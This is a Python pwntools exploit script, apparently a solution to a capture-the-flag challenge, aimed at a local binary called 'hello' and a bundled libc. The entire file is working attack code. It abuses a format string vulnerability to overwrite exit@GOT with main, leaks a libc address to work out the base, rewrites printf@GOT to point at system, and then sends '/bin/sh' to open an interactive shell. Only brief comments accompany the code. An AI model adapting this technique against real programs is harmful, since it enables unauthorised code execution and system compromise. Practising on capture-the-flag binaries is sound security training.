from pwn import *

sh = process('./hello')
libc = ELF('./libc-2.27.so')

exit = 0x601030
main = 0x4006e8
printf = 0x601018

# Rewrite exit@got to main
payload = ''
payload += 'aaaaaa%9$hhn%226x%10$hhn'.ljust(0x18, '\0')
payload += p64(exit+1)
payload += p64(exit)
sh.sendline(payload)

# Leak libc base
payload = 'bbbbbbbbbbb%9$pmark'
sleep(0.1)
sh.sendline(payload)

sh.recvuntil('bbbbbbbbbbb')
libc.address = int(sh.recvuntil('mark', drop=True), 16) - 529413

system = hex(libc.symbols['system'])
Hsystem = int(system[6:10], 16)
Lsystem = int(system[10:], 16)
print('system : %s' % system)
print('Hsystem : %s' % hex(Hsystem))
print('Lsystem : %s' % hex(Lsystem))

# Rewrite printf@got to system
payload = ''
if Hsystem > Lsystem:
    f = '%' + str(Lsystem) + 'x%10$hn'
    f += '%' + str(Hsystem - Lsystem) + 'x%11$hn'
else:
    f = '%' + str(Hsystem) + 'x%11$hn'
    f += '%' + str(Lsystem - Hsystem) + 'x%10$hn'
payload += f.ljust(0x20, '\0')
payload += p64(printf)
payload += p64(printf + 2)
sleep(0.1)
sh.sendline(payload)

# system('/bin/sh')
sleep(0.1)
sh.sendline('/bin/sh')

sh.interactive()
